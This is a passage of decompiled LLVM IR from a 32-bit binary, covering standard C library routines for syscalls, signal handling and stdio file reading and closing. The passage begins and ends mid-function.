  uselistorder i32 (i32, i32)* @sigaddset, { 2, 1, 0 }
  uselistorder i32 17, { 0, 4, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @__sigaction, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804d0f7, { 1, 0 }
  uselistorder label %dec_label_pc_804d0f0, { 1, 0 }
  uselistorder label %dec_label_pc_804cff8, { 1, 0 }
  uselistorder label %dec_label_pc_804cfe1, { 1, 0 }
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_804d11b = call i32 @__syscall_cp(i32 114, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  %v1_804d127 = call i32 @__syscall_ret(i32 %v7_804d11b)
  ret i32 %v1_804d127

; uselistorder directives
  uselistorder i32 114, { 1, 0 }
}

define i32 @poll() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v7_804d146 = call i32 @__syscall_cp(i32 168, i32 %tmp, i32 %tmp1, i32 %tmp2, i32 0, i32 0, i32 0)
  %v1_804d152 = call i32 @__syscall_ret(i32 %v7_804d146)
  ret i32 %v1_804d152
}

define i32 @select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v7_804d176 = call i32 @__syscall_cp(i32 142, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 0)
  %v1_804d182 = call i32 @__syscall_ret(i32 %v7_804d176)
  ret i32 %v1_804d182
}

define i32 @__block_app_sigs(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804d18e = load i32, i32* @esi, align 4
  store i32 175, i32* @eax, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 0, i32* @edx, align 4
  %v1_804d19f = call i32 @__vsyscall(i32 %v0_804d18e)
  ret i32 %v1_804d19f
}

define i32 @__block_all_sigs(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804d1a7 = load i32, i32* @edi, align 4
  store i32 ptrtoint (i32* @global_var_80545b0.364 to i32), i32* @ecx, align 4
  %v0_804d1ad = load i32, i32* @esi, align 4
  store i32 175, i32* @eax, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 0, i32* @edx, align 4
  %v1_804d1be = call i32 @__vsyscall(i32 %v0_804d1ad)
  store i32 %v0_804d1ad, i32* @esi, align 4
  store i32 %v0_804d1a7, i32* @edi, align 4
  ret i32 %v1_804d1be
}

define i32 @__restore_sigs(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804d1c6 = load i32, i32* @edi, align 4
  store i32 175, i32* @eax, align 4
  %v0_804d1cc = load i32, i32* @esi, align 4
  store i32 2, i32* @edx, align 4
  store i32 %arg1, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v1_804d1dd = call i32 @__vsyscall(i32 %v0_804d1cc)
  store i32 %v0_804d1c6, i32* @edi, align 4
  ret i32 %v1_804d1dd
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  store i32 37, i32* @eax, align 4
  %v1_804d1f5 = call i32 @__vsyscall(i32 ptrtoint (i32* @0 to i32))
  %v1_804d1fe = call i32 @__syscall_ret(i32 %v1_804d1f5)
  ret i32 %v1_804d1fe

; uselistorder directives
  uselistorder i32 37, { 1, 0 }
}

define i32 @__get_handler_set(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804d212 = inttoptr i32 %arg1 to i8*
  %v4_804d212 = call i32 @memcpy(i8* %v3_804d212, i32 ptrtoint (i32* @global_var_8056de4.365 to i32), i32 8)
  ret i32 %v4_804d212
}

define i32 @__libc_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d21c = load i32, i32* @edi, align 4
  %v0_804d21d = load i32, i32* @esi, align 4
  %v0_804d21e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %ebp.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %tmp = icmp ult i32 %arg1, 65
  br i1 %tmp, label %dec_label_pc_804d242, label %dec_label_pc_804d22f

dec_label_pc_804d22f:                             ; preds = %entry
  %v1_804d22f = call i32 @__errno_location(i32 %v0_804d21e)
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804d237 = inttoptr i32 %v1_804d22f to i32*
  store i32 22, i32* %v1_804d237, align 4
  %v0_804d35f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d35c

dec_label_pc_804d242:                             ; preds = %entry
  %v1_804d242 = icmp eq i32 %tmp8, 0
  br i1 %v1_804d242, label %dec_label_pc_804d2ec, label %dec_label_pc_804d24a

dec_label_pc_804d24a:                             ; preds = %dec_label_pc_804d242
  %v1_804d24a = inttoptr i32 %tmp8 to i32*
  %v2_804d24a = load i32, i32* %v1_804d24a, align 4
  %tmp26 = or i32 %v2_804d24a, 1
  %tmp27 = icmp eq i32 %tmp26, 1
  br i1 %tmp27, label %dec_label_pc_804d2ac, label %dec_label_pc_804d24f

dec_label_pc_804d24f:                             ; preds = %dec_label_pc_804d24a
  %v1_804d24f = add i32 %arg1, -1
  store i32 1, i32* @edx, align 4
  %v1_804d25b = urem i32 %v1_804d24f, 32
  %v2_804d25b = icmp eq i32 %v1_804d25b, 0
  %v2_804d25e = udiv i32 %v1_804d24f, 32
  br i1 %v2_804d25b, label %bb25, label %bb

bb:                                               ; preds = %dec_label_pc_804d24f
  %v5_804d261 = shl i32 1, %v1_804d25b
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_804d24f, %bb
  %v5_804d263 = phi i32 [ 1, %dec_label_pc_804d24f ], [ %v5_804d261, %bb ]
  %v1_804d263 = mul nuw nsw i32 %v2_804d25e, 4
  %v2_804d263 = add i32 %v1_804d263, ptrtoint (i32* @global_var_8056de4.365 to i32)
  %v3_804d263 = inttoptr i32 %v2_804d263 to i32*
  %v4_804d263 = load i32, i32* %v3_804d263, align 4
  %v6_804d263 = or i32 %v4_804d263, %v5_804d263
  store i32 %v6_804d263, i32* %v3_804d263, align 4
  %v0_804d26b = load i32, i32* @global_var_8056f84.366, align 4
  %v1_804d26b = icmp eq i32 %v0_804d26b, 0
  %v1_804d272 = icmp eq i1 %v1_804d26b, false
  br i1 %v1_804d272, label %dec_label_pc_804d2ac, label %dec_label_pc_804d274

dec_label_pc_804d274:                             ; preds = %bb25
  %v0_804d274 = load i32, i32* @global_var_8056de0.367, align 32
  %v1_804d274 = icmp eq i32 %v0_804d274, 0
  %v1_804d27b = icmp eq i1 %v1_804d274, false
  br i1 %v1_804d27b, label %dec_label_pc_804d2ac, label %dec_label_pc_804d27d

dec_label_pc_804d27d:                             ; preds = %dec_label_pc_804d274
  store i32 175, i32* @eax, align 4
  store i32 0, i32* @edi, align 4
  %v1_804d29d = call i32 @__vsyscall(i32 0)
  store i32 1, i32* @global_var_8056de0.367, align 32
  br label %dec_label_pc_804d2ac

dec_label_pc_804d2ac:                             ; preds = %dec_label_pc_804d274, %bb25, %dec_label_pc_804d24a, %dec_label_pc_804d27d
  %v1_804d2b2 = add i32 %tmp8, 132
  %v2_804d2c6 = inttoptr i32 %v1_804d2b2 to i8*
  %v3_804d2c6 = load i8, i8* %v2_804d2c6, align 1
  %v4_804d2c6 = and i8 %v3_804d2c6, 4
  %v5_804d2c6 = icmp eq i8 %v4_804d2c6, 0
  %v1_804d2cd = icmp eq i1 %v5_804d2c6, false
  br i1 %v1_804d2cd, label %dec_label_pc_804d2d4, label %dec_label_pc_804d2cf

dec_label_pc_804d2cf:                             ; preds = %dec_label_pc_804d2ac
  br label %dec_label_pc_804d2d4

dec_label_pc_804d2d4:                             ; preds = %dec_label_pc_804d2ac, %dec_label_pc_804d2cf
  %v1_804d2d8 = add i32 %tmp8, 4
  %v2_804d2df = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d2df, i32* %stack_var_-92, align 4
  %v3_804d2e4 = bitcast i32* %stack_var_-32 to i8*
  %v4_804d2e4 = call i32 @memcpy(i8* %v3_804d2e4, i32 %v1_804d2d8, i32 8)
  br label %dec_label_pc_804d2ec

dec_label_pc_804d2ec:                             ; preds = %dec_label_pc_804d242, %dec_label_pc_804d2d4
  %v4_804d2ee = icmp eq i32 %tmp4, 0
  br i1 %v4_804d2ee, label %dec_label_pc_804d2f9, label %dec_label_pc_804d2f5

dec_label_pc_804d2f5:                             ; preds = %dec_label_pc_804d2ec
  %v2_804d2f5 = ptrtoint i32* %stack_var_-64 to i32
  br label %dec_label_pc_804d2f9

dec_label_pc_804d2f9:                             ; preds = %dec_label_pc_804d2ec, %dec_label_pc_804d2f5
  %storemerge = phi i32 [ %v2_804d2f5, %dec_label_pc_804d2f5 ], [ 0, %dec_label_pc_804d2ec ]
  store i32 %storemerge, i32* @edi, align 4
  br i1 %v1_804d242, label %dec_label_pc_804d303, label %dec_label_pc_804d2ff

dec_label_pc_804d2ff:                             ; preds = %dec_label_pc_804d2f9
  br label %dec_label_pc_804d303

dec_label_pc_804d303:                             ; preds = %dec_label_pc_804d2f9, %dec_label_pc_804d2ff
  store i32 174, i32* @eax, align 4
  %v0_804d30d = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804d30d, i32* @edx, align 4
  %v0_804d30f = load i32, i32* %stack_var_-92, align 4
  %v1_804d30f = call i32 @__vsyscall(i32 %v0_804d30f)
  store i32 %v1_804d30f, i32* %stack_var_-92, align 4
  %v1_804d318 = call i32 @__syscall_ret(i32 %v1_804d30f)
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804d323 = icmp eq i32 %v1_804d318, 0
  %v1_804d325 = icmp eq i1 %v1_804d323, false
  br i1 %v1_804d325, label %dec_label_pc_804d35c, label %dec_label_pc_804d327

dec_label_pc_804d327:                             ; preds = %dec_label_pc_804d303
  store i32 0, i32* %edx.global-to-local, align 4
  br i1 %v4_804d2ee, label %dec_label_pc_804d35c, label %dec_label_pc_804d330

dec_label_pc_804d330:                             ; preds = %dec_label_pc_804d327
  %v3_804d330 = load i32, i32* %stack_var_-64, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v2_804d338 = inttoptr i32 %tmp4 to i32*
  store i32 %v3_804d330, i32* %v2_804d338, align 4
  %v1_804d33e = load i32, i32* @esi, align 4
  %v2_804d33e = add i32 %v1_804d33e, 132
  %v3_804d33e = inttoptr i32 %v2_804d33e to i32*
  %v2_804d347 = ptrtoint i32* %stack_var_-52 to i32
  %v0_804d34c = load i32, i32* @esi, align 4
  %v1_804d34e = add i32 %v0_804d34c, 4
  store i32 %v1_804d34e, i32* %stack_var_-92, align 4
  %v3_804d352 = inttoptr i32 %v1_804d34e to i8*
  %v4_804d352 = call i32 @memcpy(i8* %v3_804d352, i32 %v2_804d347, i32 8)
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d35c

dec_label_pc_804d35c:                             ; preds = %dec_label_pc_804d327, %dec_label_pc_804d303, %dec_label_pc_804d22f, %dec_label_pc_804d330
  %v0_804d35f = phi i32 [ 0, %dec_label_pc_804d327 ], [ -1, %dec_label_pc_804d303 ], [ %v0_804d35f.pre, %dec_label_pc_804d22f ], [ 0, %dec_label_pc_804d330 ]
  store i32 %v0_804d21e, i32* @ebx, align 4
  store i32 %v0_804d21d, i32* @esi, align 4
  store i32 %v0_804d21c, i32* @edi, align 4
  ret i32 %v0_804d35f

; uselistorder directives
  uselistorder i32 %v1_804d30f, { 1, 0 }
  uselistorder i1 %v4_804d2ee, { 1, 0 }
  uselistorder i32 %v1_804d25b, { 1, 0 }
  uselistorder i1 %v1_804d242, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 3, 1, 2, 0, 4 }
  uselistorder i32 %tmp4, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8056de4.365 to i32), { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d35c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d303, { 1, 0 }
  uselistorder label %dec_label_pc_804d2f9, { 1, 0 }
  uselistorder label %dec_label_pc_804d2ec, { 1, 0 }
  uselistorder label %dec_label_pc_804d2d4, { 1, 0 }
  uselistorder label %dec_label_pc_804d2ac, { 3, 0, 1, 2 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @__sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804d366 = load i32, i32* @ebx, align 4
  %tmp = and i32 %arg1, -2
  %v5_804d371 = icmp eq i32 %tmp, 32
  %v9_804d371 = icmp eq i32 %arg1, 34
  %v2_804d374 = or i1 %v5_804d371, %v9_804d371
  br i1 %v2_804d374, label %entry.dec_label_pc_804d37e_crit_edge, label %dec_label_pc_804d376

entry.dec_label_pc_804d37e_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804d37e

dec_label_pc_804d376:                             ; preds = %entry
  %v1_804d379 = call i32 @__libc_sigaction(i32 %v0_804d366)
  br label %dec_label_pc_804d37e

dec_label_pc_804d37e:                             ; preds = %entry.dec_label_pc_804d37e_crit_edge, %dec_label_pc_804d376
  %v1_804d37e = call i32 @__errno_location(i32 %v0_804d366)
  %v1_804d383 = inttoptr i32 %v1_804d37e to i32*
  store i32 22, i32* %v1_804d383, align 4
  store i32 %v0_804d366, i32* @ebx, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_804d366, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d37e, { 1, 0 }
}

define i32 @sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804d390 = load i32, i32* @ebx, align 4
  %v1_804d39c = add i32 %arg2, -1
  %v6_804d3a2 = icmp ugt i32 %v1_804d39c, 63
  br i1 %v6_804d3a2, label %dec_label_pc_804d3ac, label %dec_label_pc_804d3a4

dec_label_pc_804d3a4:                             ; preds = %entry
  %v1_804d3a4 = add i32 %arg2, -32
  %v6_804d3aa = icmp ugt i32 %v1_804d3a4, 2
  br i1 %v6_804d3aa, label %dec_label_pc_804d3bc, label %dec_label_pc_804d3ac

dec_label_pc_804d3ac:                             ; preds = %dec_label_pc_804d3a4, %entry
  %v1_804d3ac = call i32 @__errno_location(i32 %v0_804d390)
  %v1_804d3b1 = inttoptr i32 %v1_804d3ac to i32*
  store i32 22, i32* %v1_804d3b1, align 4
  br label %dec_label_pc_804d3d0

dec_label_pc_804d3bc:                             ; preds = %dec_label_pc_804d3a4
  %v2_804d3c3 = udiv i32 %v1_804d39c, 32
  %v1_804d3c6 = urem i32 %v1_804d39c, 32
  %v2_804d3c6 = icmp eq i32 %v1_804d3c6, 0
  br i1 %v2_804d3c6, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_804d3bc
  %v5_804d3c9 = shl i32 1, %v1_804d3c6
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_804d3bc, %bb
  %v6_804d3cb = phi i32 [ 1, %dec_label_pc_804d3bc ], [ %v5_804d3c9, %bb ]
  %v2_804d3cb = mul nuw nsw i32 %v2_804d3c3, 4
  %v3_804d3cb = add i32 %v2_804d3cb, %arg1
  %v4_804d3cb = inttoptr i32 %v3_804d3cb to i32*
  %v5_804d3cb = load i32, i32* %v4_804d3cb, align 4
  %v7_804d3cb = or i32 %v5_804d3cb, %v6_804d3cb
  store i32 %v7_804d3cb, i32* %v4_804d3cb, align 4
  br label %dec_label_pc_804d3d0

dec_label_pc_804d3d0:                             ; preds = %dec_label_pc_804d3ac, %bb9
  %storemerge = phi i32 [ 0, %bb9 ], [ -1, %dec_label_pc_804d3ac ]
  %v2_804d3d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d3d0, i32* @edx, align 4
  store i32 %v0_804d390, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804d3c6, { 1, 0 }
  uselistorder i32 %v1_804d39c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d3d0, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %arg1, align 4
  %v1_804d3de = add i32 %tmp1, 4
  %v2_804d3de = inttoptr i32 %v1_804d3de to i32*
  store i32 0, i32* %v2_804d3de, align 4
  ret i32 0
}

define i32 @sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d3e8 = load i32, i32* @ebx, align 4
  store i32 %v0_804d3e8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v3_804d3f8 = inttoptr i32 %arg3 to i32*
  %v4_804d3f8 = call i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32* %v3_804d3f8)
  %v1_804d400 = icmp eq i32 %v4_804d3f8, 0
  store i32 %v4_804d3f8, i32* %ebx.global-to-local, align 4
  br i1 %v1_804d400, label %dec_label_pc_804d410, label %dec_label_pc_804d406

dec_label_pc_804d406:                             ; preds = %entry
  %v0_804d406 = load i32, i32* %stack_var_-28, align 4
  %v1_804d406 = call i32 @__errno_location(i32 %v0_804d406)
  %v0_804d40b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d40b = inttoptr i32 %v1_804d406 to i32*
  store i32 %v0_804d40b, i32* %v2_804d40b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804d412.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804d410

dec_label_pc_804d410:                             ; preds = %entry, %dec_label_pc_804d406
  %v2_804d412 = phi i32 [ %tmp8, %entry ], [ %v2_804d412.pre, %dec_label_pc_804d406 ]
  %v0_804d410 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_804d406 ]
  store i32 %v2_804d412, i32* @edx, align 4
  %v2_804d414 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d414, i32* @ebx, align 4
  ret i32 %v0_804d410

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d410, { 1, 0 }
}

define i32 @__fclose_ca(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804d41c = add i32 %arg1, 12
  %v2_804d41c = inttoptr i32 %v1_804d41c to i32*
  %v3_804d41c = load i32, i32* %v2_804d41c, align 4
  store i32 %v3_804d41c, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %v3_804d41c)
  ret i32 %arg1
}

define i32 @__fopen_rb_ca(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d424 = load i32, i32* @edi, align 4
  %v0_804d425 = load i32, i32* @ebx, align 4
  store i32 %v0_804d425, i32* %stack_var_-8, align 4
  store i32 %tmp5, i32* @ebx, align 4
  store i32 %tmp5, i32* %stack_var_-28, align 4
  %v3_804d435 = bitcast i32* %arg2 to i8*
  %v4_804d435 = call i32 @memset(i8* %v3_804d435, i32 0, i32 136)
  store i32 5, i32* @eax, align 4
  store i32 557056, i32* @ecx, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_804d448 = call i32 @__vsyscall(i32 %tmp5)
  store i32 %v1_804d448, i32* %eax.global-to-local, align 4
  store i32 %v1_804d448, i32* %stack_var_-28, align 4
  %v1_804d450 = call i32 @__syscall_ret(i32 %v1_804d448)
  store i32 %v1_804d450, i32* %eax.global-to-local, align 4
  %v2_804d458 = icmp slt i32 %v1_804d450, 0
  store i32 %v1_804d450, i32* @edx, align 4
  %v1_804d45c = load i32, i32* @ebx, align 4
  %v2_804d45c = add i32 %v1_804d45c, 60
  %v3_804d45c = inttoptr i32 %v2_804d45c to i32*
  store i32 %v1_804d450, i32* %v3_804d45c, align 4
  %v1_804d45f = icmp eq i1 %v2_804d458, false
  br i1 %v1_804d45f, label %dec_label_pc_804d465, label %dec_label_pc_804d461

dec_label_pc_804d461:                             ; preds = %entry
  br label %dec_label_pc_804d4af

dec_label_pc_804d465:                             ; preds = %entry
  store i32 221, i32* @eax, align 4
  store i32 2, i32* @ecx, align 4
  store i32 1, i32* @edi, align 4
  %v0_804d474 = load i32, i32* %stack_var_-28, align 4
  %v1_804d474 = call i32 @__vsyscall(i32 %v0_804d474)
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v0_804d47d = load i32, i32* @ebx, align 4
  %v1_804d47d = inttoptr i32 %v0_804d47d to i32*
  store i32 9, i32* %v1_804d47d, align 4
  %v0_804d483 = load i32, i32* @ebx, align 4
  %v1_804d483 = add i32 %v0_804d483, 32
  %v2_804d483 = inttoptr i32 %v1_804d483 to i32*
  store i32 134534372, i32* %v2_804d483, align 4
  %v0_804d48a = load i32, i32* @ebx, align 4
  %v1_804d48a = add i32 %v0_804d48a, 40
  %v2_804d48a = inttoptr i32 %v1_804d48a to i32*
  store i32 134534528, i32* %v2_804d48a, align 4
  %v0_804d491 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d491 = add i32 %v0_804d491, 8
  %v1_804d494 = load i32, i32* @ebx, align 4
  %v2_804d494 = add i32 %v1_804d494, 44
  %v3_804d494 = inttoptr i32 %v2_804d494 to i32*
  store i32 %v1_804d491, i32* %v3_804d494, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v0_804d49b = load i32, i32* @ebx, align 4
  %v1_804d49b = add i32 %v0_804d49b, 12
  %v2_804d49b = inttoptr i32 %v1_804d49b to i32*
  store i32 134534333, i32* %v2_804d49b, align 4
  %v0_804d4a2 = load i32, i32* @ebx, align 4
  %v1_804d4a2 = add i32 %v0_804d4a2, 76
  %v2_804d4a2 = inttoptr i32 %v1_804d4a2 to i32*
  store i32 -1, i32* %v2_804d4a2, align 4
  %v0_804d4a9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d4a9 = add i32 %v0_804d4a9, -8
  store i32 %v1_804d4a9, i32* %eax.global-to-local, align 4
  %v1_804d4ac = load i32, i32* @ebx, align 4
  %v2_804d4ac = add i32 %v1_804d4ac, 48
  %v3_804d4ac = inttoptr i32 %v2_804d4ac to i32*
  store i32 %v1_804d4a9, i32* %v3_804d4ac, align 4
  %v0_804d4af.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d4af

dec_label_pc_804d4af:                             ; preds = %dec_label_pc_804d461, %dec_label_pc_804d465
  %v0_804d4af = phi i32 [ 0, %dec_label_pc_804d461 ], [ %v0_804d4af.pre, %dec_label_pc_804d465 ]
  store i32 %v0_804d4af, i32* %eax.global-to-local, align 4
  %v2_804d4b1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d4b1, i32* @edx, align 4
  %v2_804d4b2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d4b2, i32* @ebx, align 4
  store i32 %v0_804d424, i32* @edi, align 4
  ret i32 %v0_804d4af

; uselistorder directives
  uselistorder i32 %v0_804d4af, { 1, 0 }
  uselistorder i32 %v1_804d450, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804d4af, { 1, 0 }
}

define i32 @dummy.5(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__stdio_close(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804d4c4 = add i32 %arg1, 60
  %v2_804d4c4 = inttoptr i32 %v1_804d4c4 to i32*
  %v3_804d4c4 = load i32, i32* %v2_804d4c4, align 4
  %v1_804d4c7 = call i32 @dummy.5(i32 %v3_804d4c4)
  store i32 %v1_804d4c7, i32* @edx, align 4
  store i32 6, i32* @eax, align 4
  %v1_804d4d3 = call i32 @__vsyscall(i32 %v3_804d4c4)
  %v1_804d4df = call i32 @__syscall_ret(i32 %v1_804d4d3)
  ret i32 %v1_804d4df
}

define i32 @__stdio_read(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  store i32 %tmp7, i32* @ebx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804d4f9 = add i32 %tmp7, 48
  %v2_804d4f9 = inttoptr i32 %v1_804d4f9 to i32*
  %v3_804d4f9 = load i32, i32* %v2_804d4f9, align 4
  store i32 %v3_804d4f9, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v1_804d505 = icmp eq i32 %v3_804d4f9, 0
  %v1_804d507 = icmp eq i1 %v1_804d505, false
  %v2_804d507 = zext i1 %v1_804d507 to i32
  %v2_804d50a = sub i32 %arg3, %v2_804d507
  store i32 145, i32* @eax, align 4
  store i32 2, i32* @edi, align 4
  %v2_804d51e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d51e, i32* %ecx.global-to-local, align 4
  %v1_804d526 = add i32 %tmp7, 60
  %v2_804d526 = inttoptr i32 %v1_804d526 to i32*
  %v3_804d526 = load i32, i32* %v2_804d526, align 4
  store i32 %v3_804d526, i32* @edx, align 4
  %v1_804d529 = call i32 @__vsyscall(i32 %v2_804d50a)
  %v1_804d532 = call i32 @__syscall_ret(i32 %v1_804d529)
  store i32 %v1_804d532, i32* %edx.global-to-local, align 4
  %tmp18 = icmp slt i32 %v1_804d532, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_804d54a, label %dec_label_pc_804d540

dec_label_pc_804d540:                             ; preds = %entry
  %v1_804d540 = and i32 %v1_804d532, 48
  %v1_804d543 = xor i32 %v1_804d540, 16
  %v0_804d546 = load i32, i32* @ebx, align 4
  %v1_804d546 = inttoptr i32 %v0_804d546 to i32*
  %v2_804d546 = load i32, i32* %v1_804d546, align 4
  %v4_804d546 = or i32 %v2_804d546, %v1_804d543
  store i32 %v4_804d546, i32* %v1_804d546, align 4
  %v0_804d552.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d552

dec_label_pc_804d54a:                             ; preds = %entry
  %v6_804d550 = icmp ugt i32 %v1_804d532, %v2_804d50a
  br i1 %v6_804d550, label %dec_label_pc_804d556, label %dec_label_pc_804d552

dec_label_pc_804d552:                             ; preds = %dec_label_pc_804d54a, %dec_label_pc_804d540
  %v0_804d552 = phi i32 [ %v1_804d532, %dec_label_pc_804d54a ], [ %v0_804d552.pre, %dec_label_pc_804d540 ]
  store i32 %v0_804d552, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d575

dec_label_pc_804d556:                             ; preds = %dec_label_pc_804d54a
  %v2_804d54e = sub i32 %v1_804d532, %v2_804d50a
  %v0_804d556 = load i32, i32* @ebx, align 4
  %v1_804d556 = add i32 %v0_804d556, 44
  %v2_804d556 = inttoptr i32 %v1_804d556 to i32*
  %v3_804d556 = load i32, i32* %v2_804d556, align 4
  store i32 %v3_804d556, i32* %ecx.global-to-local, align 4
  %v2_804d55b = add i32 %v3_804d556, %v2_804d54e
  store i32 %v2_804d55b, i32* %edx.global-to-local, align 4
  %v1_804d55d = add i32 %v0_804d556, 48
  %v2_804d55d = inttoptr i32 %v1_804d55d to i32*
  %v3_804d55d = load i32, i32* %v2_804d55d, align 4
  %v4_804d55d = icmp eq i32 %v3_804d55d, 0
  %v2_804d561 = add i32 %v0_804d556, 4
  %v3_804d561 = inttoptr i32 %v2_804d561 to i32*
  store i32 %v3_804d556, i32* %v3_804d561, align 4
  %v0_804d564 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d564 = load i32, i32* @ebx, align 4
  %v2_804d564 = add i32 %v1_804d564, 8
  %v3_804d564 = inttoptr i32 %v2_804d564 to i32*
  store i32 %v0_804d564, i32* %v3_804d564, align 4
  br i1 %v4_804d55d, label %dec_label_pc_804d575, label %dec_label_pc_804d569

dec_label_pc_804d569:                             ; preds = %dec_label_pc_804d556
  %v0_804d569 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d569 = inttoptr i32 %v0_804d569 to i8*
  %v2_804d569 = load i8, i8* %v1_804d569, align 1
  %v2_804d56b = load i32, i32* %ebp.global-to-local, align 4
  %v3_804d56b = load i32, i32* %esi.global-to-local, align 4
  %v4_804d56b = add i32 %v2_804d56b, -1
  %v5_804d56b = add i32 %v4_804d56b, %v3_804d56b
  %v6_804d56b = inttoptr i32 %v5_804d56b to i8*
  store i8 %v2_804d569, i8* %v6_804d56b, align 1
  %v0_804d56f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d56f = add i32 %v0_804d56f, 1
  %v1_804d572 = load i32, i32* @ebx, align 4
